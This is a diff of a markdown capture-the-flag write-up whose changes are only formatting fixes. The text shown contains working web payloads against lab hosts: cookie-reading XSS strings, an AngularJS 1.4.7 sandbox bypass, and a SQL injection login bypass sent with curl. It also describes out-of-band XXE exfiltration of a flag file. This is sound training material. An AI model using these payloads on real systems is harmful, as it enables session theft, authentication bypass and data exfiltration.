@@ -172,23 +172,27 @@ I was able to solve most of the stegnography challenges with strings,binwalk, an
 XSS challenges had the IP's mentioned so that made it earier. These were the payloads for which I was able to claim the flags
 
 ```http://10.105.242.245/?q=%3Cscript%3Econsole.log(document.cookie);%3C/script%3E```
+
 ```<script>alert(document.cookie);</script>```
 
 Add events to the input text
 
 ```http://10.105.243.141/?value=%22%20onfocus=%22alert(document.cookie)%22%20autofocus=%22%22```
+
 ```" onfocus="alert(document.cookie)" autofocus=""```	
 
 The app was using templating and there was a reference to angular 1.4.7
 so I needed to bypass the angular sandbox. There was a known CVE for sandbox bypass for angular 1.4.7. Angular has since then droped the idea of sandboxes.
 
 ```http://10.105.242.92/?q={{%27i%27.constructor.prototype.charAt=%27b%27.concat;$eval(%27exploit=1}%20}%20};%20%20alert(document.cookie)//%27);}}```
+
 ```{{'i'.constructor.prototype.charAt='b'.concat;$eval('exploit=1} } };  alert(document.cookie)//');}}```
 
 ### Injection
 I was able to get SQL injection on `.210`
 
 ```curl -v -XPOST "http://10.105.243.210/login.php" --data-urlencode "username=admin" --data-urlencode "password= 1' OR '1' == '1"```
+
 ```flag{basic_sql_inj3cti0n}```
 
 **Injection 2/3** were variations of XML XEE vulnerabilities.
@@ -198,11 +202,11 @@ Injection 2 was printing the value of `<name>` back on screen so, we can define 
 Injection 3 was a similar vulenerability with on catch, there was no value being echoed back to the client. The page simply said "registration successful". For this I needed to trigger an out-of-band execution. I don't have much experience with Burp Suite, but I believe that there is a way in which burp suite can help with OOB. Anyways, I did not try burp suite.
 I host my wife's we page. So I crafted this dtd and hosted it there
 
-![system]./img/file-dtd.png)
+![system](./img/file-dtd.png)
 
 Then I posted this payload to the server
 
-![system]./img/xml-oob.png)
+![system](./img/xml-oob.png)
 
 I got back the contents of `/flag.txt` in b64 encoded form, I was able to claim this flag.
 
